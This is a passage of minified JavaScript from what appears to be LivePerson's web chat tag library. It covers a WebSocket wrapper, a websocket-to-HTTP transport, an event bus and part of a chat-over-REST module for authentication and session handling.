      Z.response ? a === Z.response && (R = !1) : "object" == typeof a && a[Z.resKey] === Z.lastKey && (R = !1);
      if (!R && K) {
        clearTimeout(K);
        K = null;
      }
      w("cb", W, {
        state: "PING_SUCCESS",
        code: 200,
        message: "Ping Response"
      });
    }
    return !R;
  }
  function F(a) {
    t(a, !0);
    X += 1;
  }
  function G() {
    p();
    A();
    J = null;
  }
  function H() {
    var a = "WebSocket is not supported here.";
    k(a, "socketNotSupported");
    return a;
  }
  function I() {
    try {
      if (S) {
        J.close();
        S = !1;
        t();
      }
    } catch (a) {
      k(a, "closeSocket");
    }
  }
  var J,
    K,
    L,
    M,
    N = "LPWebSocketWrapper",
    O = "1.1.0",
    P = !0,
    Q = !1,
    R = !1,
    S = !1,
    T = [],
    U = [],
    V = [],
    W = [],
    X = 0,
    Y = [{
      count: 5,
      timeout: 2e3
    }, {
      count: 20,
      timeout: 5e3
    }, {
      timeout: 1e4
    }],
    Z = {},
    $ = {
      autoReconnect: !0,
      reconnectTimeout: 2e3,
      maxReconnectAttempt: 100,
      idleBeforePing: 1e4,
      pingTimeout: 3e4
    },
    _ = {
      DEBUG: "DEBUG",
      INFO: "INFO",
      ERROR: "ERROR"
    };
  c(a);
  return {
    name: N,
    v: O,
    init: b,
    dispose: g,
    supported: P,
    connected: e,
    configure: P ? c : H,
    send: P ? f : H,
    restartSocket: P ? d : H,
    closeSocket: I
  };
};
window.lpTag = window.lpTag || {};
lpTag.taglets = lpTag.taglets || {};
lpTag.taglets.websocket2http = lpTag.taglets.websocket2http || function (a) {
  function b() {
    K || (K = new lpTag.taglets.LPWebSocketWrapper());
    K.supported || k("WebSockets not supported", "init");
  }
  function c(a) {
    var b;
    if (!K.supported || !a || "object" != typeof a) return !1;
    if ("string" == typeof a.server) {
      b = {
        server: a.server,
        idleBeforePing: 3e4,
        closed: u,
        created: a.created,
        message: t,
        autoReconnect: "boolean" != typeof a.autoReconnect || a.autoReconnect,
        reconnectTimeout: isNaN(a.reconnectTimeout) ? 2e3 : a.reconnectTimeout,
        maxReconnectAttempt: isNaN(a.maxReconnectAttempt) ? 30 : a.maxReconnectAttempt
      };
      a && !isNaN(a.timeout) && (P.timeout = a.timeout);
      return K.configure(b);
    }
    h("No server set for WebSocket", "configure");
  }
  function d(a) {
    var b = !1;
    if (K.connected()) for (var c = a && a.constructor !== Array ? [a] : a, d = 0; d < c.length; d++) {
      if (!l(c[d])) {
        b = !1;
        break;
      }
      b = !0;
    }
    return b;
  }
  function e(a) {
    d(a) ? m(a) : a && K.connected() ? D("error", a, W) : D("error", a, X);
  }
  function f(a) {
    var b = !1,
      c = [];
    if (a) {
      "string" == typeof a ? c = [a] : a && a.constructor === Array && (c = a);
      for (var d = 0; d < c.length; d++) if (T[c[d]]) {
        B(T[c[d]]);
        b = !0;
      }
      n(c);
    }
    return b;
  }
  function g(b, c, d) {
    if (a.lpTag && lpTag.log) {
      "string" == typeof b && d && (b = d + ": " + b);
      lpTag.log(b, c, N);
    }
  }
  function h(a, b) {
    g(a, O.ERROR, b);
  }
  function i(a, b) {
    g(a, O.DEBUG, b);
  }
  function j(a, b) {
    g(a, O.TRACE, b || "");
  }
  function k(a, b) {
    g(a, O.INFO, b);
  }
  function l(a) {
    return !(!a || "string" != typeof a.url || 0 !== a.url.indexOf("http") || !r(a.url) || "function" != typeof a.success);
  }
  function m(a) {
    var b;
    Q += 1;
    try {
      b = p(a);
      K.send(b);
      L = new Date().getTime();
    } catch (c) {
      b && o(b);
      h("Failed to run request, exc " + c.message, "_runRequest");
      R += 1;
    }
  }
  function n(a) {
    var b = {
      cancelId: a
    };
    K.connected() && K.send(b);
  }
  function o(a) {
    D("error", a, V);
    for (var b = 0; b < a.length; b++) B(a[b].name);
  }
  function p(a) {
    for (var b = a && a.constructor === Array ? a : a ? [a] : [], c = [], d = 0; d < b.length; d++) c.push(q(b[d]));
    return c;
  }
  function q(a) {
    var b,
      c = E(),
      d = new Date().getTime();
    b = I(a);
    b = H(b);
    b.name = c;
    a.launchTime = d;
    S[c] = a;
    return b;
  }
  function r(a) {
    if (!(U.length > 0)) return !0;
    var b,
      c = !1,
      d = /https{0,1}:\/\/([^\/|\s]+)/gi.exec(a);
    b = 2 === d.length ? d[1] : "";
    if (b) for (var e = 0; e < U.length; e++) {
      c = s(b, U[e]);
      if (c) return c;
    }
  }
  function s(a, b) {
    var c = !0,
      d = a.split(".");
    if (d.length > 2) for (var e = d.length - 1, f = b.split("."), g = f.length - 1; g >= 0; g--) {
      if (d[e] !== f[g] && "*" !== f[g]) {
        c = !1;
        break;
      }
      if (!(e - 1 > 0)) break;
      e -= 1;
    } else c = !1;
    return c;
  }
  function t(a) {
    if ("object" == typeof a) for (var b in a) a.hasOwnProperty(b) && b && (S[b] ? w(b, S[b], a[b]) : "config" === b && a[b].allowDomain ? A(a[b].allowDomain) : h("Callback not found for key:" + b + " response:" + JSON.stringify(a[b]), "_handleMessage"));else h("Message response not an object: " + a, "_handleMessage");
  }
  function u(a) {
    D("error", S, X);
    h("Socket closed: " + JSON.stringify(a));
  }
  function v(a) {
    void 0 === a.responseCode && (void 0 !== a.statusCode ? a.responseCode = a.statusCode : void 0 !== a.HTTPStatus && (a.responseCode = a.HTTPStatus));
    return a;
  }
  function w(a, b, c) {
    var d;
    if (c) {
      c = v(c);
      if (c.responseCode < 400 || c.statusCode && c.statusCode < 400) d = b.success;else {
        d = b.error;
        R += 1;
      }
      if (z(a)) {
        "object" == typeof c && (c.requestName = a);
        y(a, c.cancelId);
      } else B(a);
      j(x(b, c), "_runMessageResponse");
      C(d, c, b.context);
      i("Ran response for key: " + a, "_runMessageResponse");
    }
  }
  function x(a, b) {
    var c = {},
      d = new Date().getTime();
    c[a.url] = {
      duration: d - a.launchTime,
      request: I(a),
      response: I(b)
    };
    return c;
  }
  function y(a, b) {
    if (b && S[a]) {
      S[a].cancelId = b;
      T[b] = a;
    }
  }
  function z(a) {
    return S[a] && !0 === S[a].persistent;
  }
  function A(a) {
    U = a;
    U && U.constructor === Array && 1 === U.length && "*" === U[0] && (U.length = 0);
    i("Allowed Domains: " + JSON.stringify(a), "_setAllowedDomains");
  }
  function B(a) {
    S[a] = null;
    delete S[a];
  }
  function C(a, b, c) {
    if ("function" == typeof a) try {
      a.call(c || null, b);
    } catch (d) {
      h("Error executing callback", "_runCallback");
    }
  }
  function D(a, b, c) {
    var d;
    if (b) {
      d = b.constructor === Array ? b : [b];
      for (var e = 0; e < d.length; e++) C(d[e][a], I(c), d[e].context);
    }
    d = null;
  }
  function E() {
    return "ws" + (Math.abs(Math.round(9999999999 * Math.random())) + new Date().getTime());
  }
  function F(a) {
    var b = "";
    if ("string" == typeof a) b += a;else {
      var c = !0;
      for (var d in a) {
        var e;
        "object" == typeof a[d] ? e = JSON.stringify(a[d]) : "function" != typeof a[d] && (e = a[d]);
        if (void 0 !== e) {
          c || (b += "&");
          b += encodeURIComponent(d) + "=" + encodeURIComponent(e);
          c = !1;
        }
      }
    }
    return b;
  }
  function G(a, b) {
    var c = F(b);
    if (c) {
      a += a.indexOf("?") < 0 ? "?" : "&";
      a += c;
    }
    return a;
  }
  function H(a) {
    a.method || (a.method = "GET");
    isNaN(a.timeout) && (a.timeout = P.timeout);
    a.caseSensitiveHeaders = !1 !== a.caseSensitiveHeaders;
    if (a.query) {
      a.url = G(a.url, a.query);
      a.query = null;
    }
    return a;
  }
  function I(a) {
    try {
      return JSON.parse(J(a));
    } catch (b) {
      h("Failed to clone object", "_cloneSimpleObj");
      return new Error("Failed to clone object");
    }
  }
  function J(a) {
    var b;
    if ("function" == typeof Array.prototype.toJSON) {
      var c = Array.prototype.toJSON;
      delete Array.prototype.toJSON;
      try {
        b = JSON.stringify(a);
      } catch (d) {
        Array.prototype.toJSON = c;
        throw d;
      }
      Array.prototype.toJSON = c;
    } else b = JSON.stringify(a);
    return b;
  }
  var K,
    L,
    M = "0.9.4",
    N = "websocket2http",
    O = {
      DEBUG: "DEBUG",
      INFO: "INFO",
      ERROR: "ERROR",
      TRACE: "TRACE"
    },
    P = {
      timeout: 3e4
    },
    Q = 0,
    R = 0,
    S = {},
    T = {},
    U = [],
    V = {
      statusCode: 400,
      responseCode: 400,
      message: "Malformed/Bad request, unable to service it",
      name: "BADREQUEST"
    },
    W = {
      statusCode: 401,
      responseCode: 401,
      message: "Batch(elor) WS can't service this request.",
      name: "FORBIDDEN"
    },
    X = {
      statusCode: 500,
      responseCode: 500,
      message: "WebSocket is not connected",
      name: "NOCONNECTION"
    };
  b();
  var Y = {
    init: b,
    configure: c,
    name: N,
    version: M,
    issueCall: e,
    cancelPersistentRequest: f,
    isValidRequest: d,
    inspect: function () {
      return {
        name: N,
        version: M,
        callsMade: Q,
        errorsFound: R
      };
    }
  };
  if (K && K.supported && lpTag.taglets.lpAjax) try {
    lpTag.taglets.lpAjax.addTransport(N, Y);
  } catch (Z) {}
  return Y;
}(window);
!function (a, b) {
  "use strict";

  if ("object" == typeof exports) b(a, exports);else {
    a.Chronos = a.Chronos || {};
    b(a, a.Chronos);
  }
}(void 0 === window.lpTag ? this : window.lpTag, function (a, b, c) {
  "use strict";

  function d(a, b, c) {
    var d = [];
    if (a[b] && a[b].length) for (var e = 0; e < a[b].length; e++) c && "*" !== a[b][e].appName && a[b][e].appName !== c || d.push(a[b][e]);
    if (a["*"]) for (var f = 0; f < a["*"].length; f++) c && "*" !== a["*"][f].appName && a["*"][f].appName !== c || d.push(a["*"][f]);
    return d;
  }
  function e(b, c, d) {
    a && "function" == typeof a.log && a.log(b, c, d);
  }
  function f(a) {
    var b,
      c = a.unbindObj[a.attrName],
      d = !1;
    if (!a.unbindObj) {
      e("CMD listen id not spec for unbind", "ERROR", a.loggerName);
      return null;
    }
    if ("string" == typeof a.unbindObj) return j(a.lstnrs, a.unbindObj);
    if (!a.unbindObj.func && !a.unbindObj.context && !a.unbindObj.appName) return !1;
    var f = a.lstnrs;
    if (c) {
      f = {};
      f[c] = a.lstnrs[c];
    }
    for (var g in f) if (f.hasOwnProperty(g) && f[g] && f[g].length) {
      b = k(f[g], a.unbindObj.func, a.unbindObj.context, a.unbindObj.appName);
      if (b.length !== f[g].length) {
        a.lstnrs[g] = b;
        d = !0;
      }
    }
    return d;
  }
  function g(a) {
    var b = {};
    if (a.constructor === Object) for (var c in a) a.hasOwnProperty(c) && null !== a[c] && void 0 !== a[c] && ("object" == typeof a[c] && a[c].constructor !== Array ? b[c] = g(a[c]) : a[c].constructor === Array ? b[c] = a[c].slice(0) || [] : "function" != typeof a[c] && (b[c] = null !== a[c] && void 0 !== a[c] ? a[c] : ""));else a.constructor === Array ? b = a.slice(0) || [] : "function" != typeof a && (b = a);
    return b;
  }
  function h(a, b, c) {
    if ((void 0 === c || "*" === c) && "*" === b) return a;
    for (var d = [], e = 0; e < a.length; e++) a[e].eventName !== c && "*" !== c || (b && b === a[e].appName || !a[e].appName || "*" === a[e].appName || "*" === b) && d.push(a[e]);
    return d;
  }
  function i(a) {
    if (0 === a.eventBufferLimit || a.triggerData.data && a.triggerData.data.doNotStore) a = null;else {
      var b = {
        eventName: a.triggerData[a.attrName],
        appName: a.triggerData.appName
      };
      b.data = a.triggerData.passDataByRef ? a.triggerData.data : g(a.triggerData.data);
      if (a.eventBufferLimit > 0) {
        a.index >= a.eventBufferLimit && (a.index = 0);
        a.fired[a.index] = b;
        a.index++;
      } else a.fired.push(b);
      a = null;
    }
  }
  function j(a, b) {
    var c = !1;
    if (!b) {
      e("Ev listen id not spec for unregister", "ERROR", "Events");
      return null;
    }
    for (var d in a) if (a.hasOwnProperty(d)) for (var f = 0; f < a[d].length; f++) if (a[d][f].id == b) {
      a[d].splice(f, 1);
      e("Ev listen=" + b + " and name=" + d + " unregister", "DEBUG", "Events");
      c = !0;
      break;
    }
    c || e("Ev listen not found " + b + " unregister", "DEBUG", "Events");
    return c;
  }
  function k(a, b, c, d) {
    var f = [];
    if (a && a.length) for (var g = 0; g < a.length; g++) try {
      var h = !c && a[g].func === b,
        i = !b && c && a[g].context === c,
        j = b && c && a[g].func === b && a[g].context === c,
        k = d && d === a[g].appName,
        l = "*" === a[g].appName;
      if (h || i || j) {
        if (k || l) continue;
        if (i) continue;
      } else if (!b && !c && k) continue;
      f.push(a[g]);
    } catch (m) {
      e("Error in unbind e=" + m.message, "ERROR", "Events");
    }
    return f;
  }
  var l = {
    getListeners: d,
    log: e,
    unbind: f,
    hasFired: h,
    cloneEventData: g,
    storeEventData: i
  };
  c || (b.EventsUtil = b.EventsUtil || l);
  return l;
});
!function (a, b) {
  "use strict";

  if ("object" == typeof exports) b(a, exports, require("./util/EventsUtil").EventsUtil);else {
    a.Chronos = a.Chronos || {};
    b(a, a.Chronos, a.Chronos.EventsUtil);
  }
}(void 0 === window.lpTag ? this : window.lpTag, function (a, b, c, d) {
  "use strict";

  function e(a) {
    function b(a) {
      if (a) {
        a.triggerOnce = !0;
        return d(a);
      }
      return null;
    }
    function d(a, b, e) {
      var f = a;
      "string" == typeof a && (f = {
        appName: a,
        eventName: b,
        func: e
      });
      f.appName = f.appName || l;
      "*" !== l && ("string" != typeof a || "function" != typeof b && void 0 !== b || (f.eventName = a));
      if (!f.eventName || !f.func || "function" != typeof f.func && f.func.constructor !== Array) {
        c.log("Ev listen has invalid params: evName=[" + f.eventName + "]", "ERROR", "Events");
        return null;
      }
      if (f.func.constructor === Array) {
        for (var g, h, i = [], j = 0; j < f.func.length; j++) {
          g = c.cloneEventData(f);
          g.func = f.func[j];
          h = d(g);
          i.push(h);
        }
        return i;
      }
      var k = r + o++,
        m = {
          id: k,
          func: f.func,
          context: f.context || null,
          aSync: !!f.aSync,
          appName: f.appName,
          triggerOnce: f.triggerOnce || !1
        };
      p[f.eventName] = p[f.eventName] || [];
      p[f.eventName].push(m);
      c.log("Ev listen rgstr: evName=[" + f.eventName + "] aSync=" + m.aSync + " appName=" + m.name, "DEBUG", "Events");
      f = null;
      a = null;
      return k;
    }
    function e(a) {
      "*" !== l && (a.appName = a.appName || l);
      return c.unbind({
        unbindObj: a,
        attrName: n,
        loggerName: m,
        lstnrs: p
      });
    }
    function f(a, b) {
      if (void 0 === b) {
        b = a;
        a = l;
      }
      return c.hasFired(q, a, b);
    }
    function g(a, b, d) {
      var e = a;
      "string" == typeof a && (e = {
        eventName: b,
        appName: a,
        data: d
      });
      if ("*" !== l) {
        e.appName = e.appName || l;
        "string" != typeof a || "object" != typeof b && void 0 !== b || (e.eventName = a);
      }
      if (!e || void 0 === e.eventName) {
        c.log("Ev name not spec for publish", "ERROR", "Events");
        e = null;
        return null;
      }
      e.passDataByRef = e.passDataByRef || !j;
      i(e);
      var f = c.getListeners(p, e.eventName, e.appName);
      if (f.length > 0) for (var g = 0; g < f.length; g++) {
        var k = e.passDataByRef ? e.data : c.cloneEventData(e.data),
          m = {
            appName: e.appName,
            eventName: e.eventName
          },
          n = f[g];
        n.aSync || k && k.aSync ? setTimeout(h(n, k, m), 0) : h(n, k, m)();
      }
      e = null;
      return f.length > 0;
    }
    function h(a, b, d) {
      return function () {
        try {
          a.func.call(a.context, b, d);
          b = null;
          a.triggerOnce && e(a);
          a = null;
        } catch (f) {
          c.log("Error executing " + d.eventName + " eventId: " + a.id + "e=" + f.message, "ERROR", "Events");
        }
      };
    }
    function i(a) {
      c.storeEventData({
        triggerData: a,
        eventBufferLimit: k,
        attrName: n,
        fired: q,
        index: s
      });
    }
    var j,
      k,
      l,
      m = "Events",
      n = "eventName",
      o = 0,
      p = {},
      q = [],
      r = "evId_",
      s = 0;
    l = a && a.appName || "*";
    j = !(!a || "boolean" != typeof a.cloneEventData) && a.cloneEventData;
    k = a && !isNaN(a.eventBufferLimit) ? a.eventBufferLimit : -1;
    this.once = b;
    this.hasFired = f;
    this.trigger = g;
    this.publish = g;
    this.bind = d;
    this.register = d;
    this.unbind = e;
    this.unregister = e;
  }
  d || (b.Events = b.Events || e);
  return e;
});
window.lpTag = window.lpTag || {};
lpTag.taglets = lpTag.taglets || {};
lpTag.utils = lpTag.utils || {};
lpTag.utils.log = lpTag.utils.log || function () {};
lpTag.utils.log.debug = !1;
lpTag.taglets.ChatOverRestAPI = lpTag.taglets.ChatOverRestAPI || function (a) {
  function b() {
    var a,
      b = ua && ua.domain;
    b && ua.lpNumber && (a = "https://" + b + "/api/account/" + ua.lpNumber + "/conversation.json?v=1&NC=true");
    return a;
  }
  function c(a) {
    return [oa.cId, oa.sId, oa.vId, oa.authChatConnId, oa.ssoKey, oa.eId, oa.redirectUri].filter(function (b) {
      return void 0 === a[b];
    });
  }
  function d(a) {
    var c = b();
    if (c && a) {
      var d = ga.validateAndExtendConfigs([{
          obj: a,
          type: sa.STR,
          path: oa.cId,
          prop: oa.leCid
        }, {
          obj: a,
          type: sa.STR,
          path: oa.sId,
          prop: oa.leSid
        }, {
          obj: a,
          type: sa.STR,
          path: oa.vId,
          prop: oa.leVid
        }, {
          obj: a,
          type: sa.NUM,
          path: oa.authChatConnId,
          prop: oa.authChatConnId
        }, {
          obj: a,
          type: sa.STR,
          path: oa.ssoKey,
          prop: oa.ssoKey
        }, {
          obj: a,
          type: sa.NUM,
          path: oa.eId,
          prop: oa.eId
        }, {
          obj: a,
          type: sa.STR,
          path: oa.redirectUri,
          prop: oa.redirectUri
        }], {}),
        e = {
          data: d,
          transportOrder: ja,
          method: "POST",
          url: c,
          retries: Ha.retries,
          timeout: Ha.timeout,
          headers: {
            Accept: "application/json",
            Authorization: "LivePerson appKey=" + ua.appKey
          },
          success: function (b) {
            b = b || {};
            v(na.DEBUG, {
              originalRequest: a,
              sentRequest: e,
              body: b
            });
            aa.publish({
              eventName: qa.onAuthentication,
              data: b.body
            });
            e = null;
          },
          error: function (b) {
            b = b || {};
            v(na.ERROR, {
              originalRequest: a,
              sentRequest: e,
              response: b
            });
            aa.publish({
              eventName: qa.onAuthenticationFail,
              data: {
                error: "authenticate - Request failed",
                response: b.body
              }
            });
            e = null;
          }
        };
      e = U(e);
      try {
        v(na.INFO, {
          originalRequest: a || "",
          sentRequest: e,
          response: "SENDING REQUEST"
        });
        return ia.issueCall(e);
      } catch (f) {
        v(na.ERROR, {
          request: e,
          message: "authenticate - Failed to send request"
        });
        aa.publish({
          eventName: qa.onAuthenticationFail,
          data: {
            error: "authenticate - Failed to send request",
            response: f
          }
        });
      }
    } else {
      v(na.ERROR, {
        originalRequest: a,
        message: "authenticate - Invalid input"
      });
      aa.publish({
        eventName: qa.onAuthenticationFail,
        data: {
          error: "authenticate - Invalid input"
        }
      });
    }
  }
  function e(a, b) {
    a = a || {};
    (b.text || b.json) && (a.event = a.event || {});
    b.text && (a.event.text = b.text);
    if (b.json) {
      a.event.textType = oa.RichContent;
      a.event.json = b.json;
      a.event.metadata = b.metadata || [];
    }
    return a;
  }
  function f() {
    function b() {
      if (e) {
        clearTimeout(e);
        e = null;
      }
    }
    function c() {
      P({
        success: d,
        error: d
      });
      f = new Date().valueOf();
    }
    function d() {
      if (g) {
        b();
        var a = new Date().valueOf() - f;
        a = i - a;
        a > 0 ? e = setTimeout(c, a) : c();
      }
    }
    var e,
      f,
      g,
      h = {
        inChat: a && a.chatPollInterval || 2e3,
        exitSurvey: a && a.chatExitSurveyInterval || 15e3
      },
      i = h.inChat,
      j = this;
    j.changeKeepAliveState = function () {
      b();
      g = !Ga && (ra.chatInProgress || ra.exitSurveyOn);
      if (g) {
        i = ra.chatInProgress ? h.inChat : h.exitSurvey;
        c();
      }
    };
    j.stopKeepAliveRequests = function () {
      if (ra.exitSurveyOn) {
        ra.exitSurveyOn = !1;
        g = !1;
        b();
      }
    };
    j.storeChatLocationURI = function (b, c) {
      var d = t(ka.chat);
      a.sessionUID && (d = t(a.sessionUID));
      var e = {
        chatRel: b,
        location: window.location.href
      };
      if (c) {
        e.overRides = {};
        for (var f in c) c.hasOwnProperty(f) && (e.overRides[f] = c[f]);
      }
      _.setSessionData(d, e);
    };
    j.sessionEnded = function () {
      _.removeSessionData(t(ka.sessionVars));
      _.removeSessionData(t(ka.chat));
      _.removeSessionData(t(ka.resumeMode));
      a.sessionUID && _.removeSessionData(t(a.sessionUID));
    };
  }
  function g(a, b) {
    return ga.validateAndExtendConfigs([{
      obj: b,
      type: sa.STR,
      path: oa.leVid,
      prop: oa.leVid
    }, {
      obj: b,
      type: sa.STR,
      path: oa.leSid,
      prop: oa.leSid
    }, {
      obj: b,
      type: sa.STR,
      path: oa.leCid,
      prop: oa.leCid
    }, {
      obj: b,
      type: sa.STR,
      path: oa.skill,
      prop: oa.skill
    }], a, !1);
  }
  function h(b) {
    if (lpTag.Chronos.Events && lpTag.RelManager && lpTag.SessionDataManager) {
      aa = new lpTag.Chronos.Events({
        cloneEventData: !0,
        eventBufferLimit: 50
      });
      ba = new f();
      ca = new lpTag.RelManager(b && b.transportOrder || ja);
      a = a || {};
      a.appName = ea;
      _ = new window.lpTag.utils.SessionDataAsyncWrapper(a);
      m();
    } else 20 > Fa && setTimeout(h, 500);
    Fa++;
  }
  function i() {
    for (var a in qa) qa.hasOwnProperty(a) && (da[a] = j(a));
  }
  function j(a) {
    return function (b, c, d) {
      return r(a, b, c || "", d);
    };
  }
  function k() {
    return !!(ua.lpNumber && ua.appKey && ua.domain);
  }
  function l(b, c) {
    if (b) {
      b.clearDomain ? ua.domain = ga.trim(b.domain) : ua.domain = ga.trim(b.domain) || ga.trim(ua.domain) || "";
      ua.lpNumber = ga.trim(b.lpNumber) || ga.trim(ua.lpNumber) || "";
      ua.appKey = ga.trim(b.appKey) || ga.trim(ua.appKey) || "";
      a.sessionUID && (ua.sessionUID = a.sessionUID);
      if (ua.lpNumber && ua.appKey && ua.domain) {
        ca.setData(ua);
        typeof c === sa.BOOL && !c || _.usingSecureStorage || _.setSessionData(t(ka.sessionVars), ua);
      }
      ma = b && b.environment && la[b.environment] ? b.environment : ma;
      ua.domain && ua.lpNumber && x();
    }
  }
  function m() {
    function b(a) {
      var b;
      for (var c in a) if (a.hasOwnProperty(c) && 0 === String(c).indexOf("on") && da.hasOwnProperty(c)) {
        a[c] = a[c].constructor === Array ? a[c] : [a[c]];
        for (var e = 0; e < a[c].length; e++) {
          b = d(c, a[c][e]);
          da[c](b.callback, b.appName, b.context);
        }
      }
    }
    function c(a) {
      var b;
      for (var c in pa) if (a.hasOwnProperty(c)) {
        b = d(c, a[c]);
        r(b.eventName, b.callback, b.appName, b.context);
      }
    }
    function d(a, b) {
      var c = null;
      b = typeof b === sa.OBJ ? b : {
        callback: b
      };
      "function" == typeof b.callback && (c = {
        eventName: a,
        callback: b.callback,
        context: b.context || null,
        appName: b.appName || ""
      });
      return c;
    }
    function e() {
      document.body ? q() : setTimeout(e, 5);
    }
    function f(a) {
      var b = {};
      if (a) for (var c in a) if (a.hasOwnProperty(c)) {
        var d = void 0 !== b[c],
          e = 0 === c.indexOf("on");
        if (d) {
          if (b[c] === a[c] || e) {
            b[c] = b[c].constructor === Array ? b[c] : [b[c]];
            b[c].push(a[c]);
          } else b[c] = a[c];
        } else b[c] = a[c];
      }
      return b;
    }
    da.onInit(function (a) {
      a.error || (ra.initialised = !0);
    });
    da.onStart(function (a) {
      a.error || (ra.chatInProgress = !0);
    });
    da.onState(function (a) {
      if (!a.error) {
        ra.state = a.state;
        switch (ra.state) {
          case da.chatStates.RESUMING:
            ra.chatInProgress = !0;
            break;
          case da.chatStates.CHATTING:
          case da.chatStates.WAITING:
            _.usingSecureStorage || _.setSessionData(t(ka.resumeMode), !0, null, null, null, !1);
            ra.chatInProgress = !0;
            ra.agentName = "";
            ra.agentId = "";
            ra.agentPictureUrl = "";
            ba.changeKeepAliveState();
            break;
          case da.chatStates.INITIALISED:
            ra.chatInProgress = !!Ea;
            break;
          case da.chatStates.ENDED:
          case da.chatStates.UNINITIALISED:
            ra.chatInProgress = !1;
            ba.changeKeepAliveState();
            break;
          case da.chatStates.NOTFOUND:
            ra.chatInProgress = !1;
            ra.exitSurveyOn = !1;
            ba.changeKeepAliveState();
        }
      }
    });
    da.onVisitorName(function (a) {
      a.error || (ra.visitorName = a.visitorName);
    });
    da.onSetVisitorTyping(function (a) {
      a.error || (ra.typing = a.typing);
    });
    ta = f(a);
    l(ta, !1);
    b(ta);
    c(ta);
    typeof ta.debug === sa.BOOL && da.setDebugMode(ta.debug);
    e();
  }
  function n(a) {
    return a || window.lpMTagConfig && window.lpMTagConfig.FPC_CONT || _.readCookie("HumanClickSiteContainerID_" + ta.lpNumber) || null;
  }
  function o(a) {
    return a || window.lpMTagConfig && window.lpMTagConfig.LPSID_VAR || _.readCookie(ta.lpNumber + "-SKEY") || null;
  }
  function p(a) {
    return a || window.lpMTagConfig && window.lpMTagConfig.FPC_VID || _.readCookie(ta.lpNumber + "-VID") || null;
  }
  function q() {
    Ca = !0;
    if (a.doNotResume && ma !== la.PRODUCTION) {
      if (k()) {
        G();
        aa.publish({
          eventName: qa.onLoad,
          data: {
            API: "Chat API SDK Loaded",
            version: fa,
            state: Ea ? da.chatStates.RESUMING : da.chatStates.UNINITIALISED
          }
        });
        ra.chatInProgress = !1;
      }
    } else a.sessionUID ? _.getSessionData(t(a.sessionUID), B, B, null) : _.getSessionData(t(ka.resumeMode), y, y, null);
  }
  function r(a, b, c, d) {
    if (!aa) return !1;
    var e = {
      eventName: a,
      appName: c || "",
      aSync: !1,
      func: b,
      context: d || null
    };
    return aa.register(e);
  }
  function s(a, b, c, d) {
    if (!aa) return !1;
    if ("function" == typeof a) {
      c = a;
      a = "";
    } else if (typeof a === sa.OBJ) {
      d = a;
      a = "";
    }
    var e = {
      eventName: a,
      appName: b || "",
      func: c,
      context: d || null
    };
    return aa.unbind(e);
  }
  function t(b) {
    if (!a.lpNumber) return "";
    if (typeof b === sa.OBJ) {
      var c = [];
      for (var d in b) b.hasOwnProperty(d) && c.push(b[d] + a.lpNumber);
      return c;
    }
    return b + a.lpNumber;
  }
  function u(a, b, c, d) {
    v(na.ERROR, {
      error: a,
      originalRequest: b,
      sentRequest: c,
      response: d
    });
    b = null;
    c = null;
    d = null;
    return a;
  }
  function v(a, b) {
    var c = {
      eventName: qa.onLog
    };
    a && typeof a === sa.STR ? c.appName = a : typeof a === sa.OBJ && (b = a);
    c.data = b;
    if (!c.appName || c.appName === na.ERROR || Da) {
      aa.publish(c);
      c = null;
    } else c = null;
  }
  function w() {
    return ma != la.PRODUCTION ? "/hcp/html/lpsunco/postmessage.html" : "/hcp/html/postmessage.min.html";
  }
  function x() {
    var a = {
      rest2jsonp: {
        domain: ua.domain,
        site: ua.lpNumber
      },
      postmessage: {
        frames: [{
          url: "https://" + ua.domain + w(),
          delayLoad: 0
        }]
      }
    };
    ta && ta.batchelor && (a.websocket2http = {
      idleBeforePing: 15e3,
      server: ta.batchelor
    });
    ia.configureTransports(a);
  }
  function y(a) {
    1 == a ? _.getSessionData(t(ka.sessionVars), A, A, null) : z();
  }
  function z() {
    ra.chatInProgress = !1;
    Ea = !1;
    aa.publish({
      eventName: qa.onLoad,
      data: {
        API: "Chat API SDK Loaded",
        version: fa,
        state: Ea ? da.chatStates.RESUMING : da.chatStates.UNINITIALISED
      }
    });
    G();
  }
  function A(b) {
    if (b && typeof b === sa.OBJ && !b.error) {
      if (C(a, b)) {
        l(b);
        Ea = !0;
        _.getSessionData(t(ka.chat), B, B, null);
      }
    } else z();
  }
  function B(b) {
    if (!b || b && !b.chatRel) z();else {
      a.sessionUID && ba.storeChatLocationURI(b.chatRel);
      ra.chatInProgress = !0;
      aa.publish({
        eventName: qa.onLoad,
        data: {
          API: "Chat API SDK Loaded",
          version: fa,
          state: Ea ? da.chatStates.RESUMING : da.chatStates.UNINITIALISED
        }
      });
      b.overRides && l(b.overRides);
      G({
        success: function () {
          ca.addRels({
            link: [{
              rel: "location",
              href: b.chatRel
            }]
          }, {
            type: "chat"
          });
          Y(W(da.chatStates.RESUMING, new Date()));
          M(null, b.overRides);
        },
        error: function () {
          ba.sessionEnded();
        }
      });
    }
  }
  function C(a, b) {
    for (var c = ["lpNumber", "appKey", "sessionUID"], d = !0, e = 0; e < c.length; e++) {
      var f = c[e];
      a[f] != b[f] && ("sessionUID" === f ? a[f] && b[f] && (d = !1) : d = !1);
      if (!d) break;
    }
    return d;
  }
  function D(a, b, c, d, e, f) {
    v(na.ERROR, {
      originalRequest: a,
      sentRequest: b,
      response: c
    });
    c = ga.getErrorData(c, e, a);
    E(d, c, f);
    ga.runErrorCallback(a, c);
    b = null;
    return c;
  }
  function E(a, b, c) {
    a = a.constructor === Array ? a : [a];
    for (var d = 0; d < a.length; d++) aa.publish({
      eventName: a[d],
      appName: c || "",
      data: b
    });
  }
  function F(a) {
    var b = {
      site: a.lpNumber
    };
    b.success = function (b) {
      a.domain = b.domain;
      G(a);
    };
    b.error = function (b) {
      u({
        error: "unable to resolve site domain"
      }, a, "", b);
      D({}, {}, {}, qa.onInit, "unable to initiate session");
      ga.runErrorCallback(a);
    };
    da.getSiteDomain(b);
  }
  function G(a) {
    a = a || {};
    l(a);
    a.lpNumber = ua.lpNumber;
    a.appKey = ua.appKey;
    a.domain = ua.domain;
    if (!a.lpNumber) return u({
      error: "missing site configuration data, cannot _init"
    }, a, "", "");
    if (!a.domain) {
      F(a);
      return !1;
    }
    if (!k()) return !1;
    ca.setData(a);
    var b = ca.buildRequestObj({
      rel: "",
      data: {
        lpNumber: ua.lpNumber,
        appKey: ua.appKey,
        domain: ua.domain
      }
    });
    b = U(b);
    b.success = function (c) {
      v(na.INFO, {
        originalRequest: a,
        sentRequest: b,
        response: c
      });
      if (c) {
        ca.addRels(c, {
          type: "chat"
        });
        J("self", {
          type: "chat",
          ignoreParameters: !0
        }, [{
          rel: "OTK",
          href: "chat/resumeWithOTK"
